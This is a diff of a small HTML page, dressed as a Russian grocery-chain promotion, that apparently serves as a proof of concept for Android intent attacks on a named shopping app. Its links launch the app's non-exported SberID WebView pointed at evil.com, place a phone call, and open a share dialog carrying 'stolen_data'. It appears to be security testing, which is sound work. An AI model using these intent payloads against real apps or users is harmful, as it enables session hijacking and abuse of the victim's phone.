@@ -1,16 +1,20 @@
 <html><body>
 <h1>Специальное предложение Азбука Вкуса</h1>
 
-<p><a href="intent://#Intent;action=android.settings.SETTINGS;end">
-  Тест 1 — Открыть настройки телефона
-</a></p>
-
 <p><a href="intent://www.google.com/#Intent;scheme=https;action=android.intent.action.VIEW;end">
-  Тест 2 — Открыть Google в браузере
+  1. Открыть Google в браузере
 </a></p>
 
-<p><a href="intent://#Intent;component=sberid.sdk.auth.view.activity.WebViewActivity;S.uri=https://evil.com;end">
-  Тест 3 — Открыть SberID WebView (non-exported)
+<p><a href="intent://#Intent;action=android.intent.action.CALL;data=tel:+79991234567;end">
+  2. Инициировать звонок на номер
+</a></p>
+
+<p><a href="intent://#Intent;component=ru.av.vkusomania/sberid.sdk.auth.view.activity.WebViewActivity;S.uri=https://evil.com;end">
+  3. SberID WebView
+</a></p>
+
+<p><a href="intent://#Intent;action=android.intent.action.SEND;type=text/plain;S.android.intent.extra.TEXT=stolen_data;end">
+  4. Открыть share dialog с данными
 </a></p>
 
 </body></html>
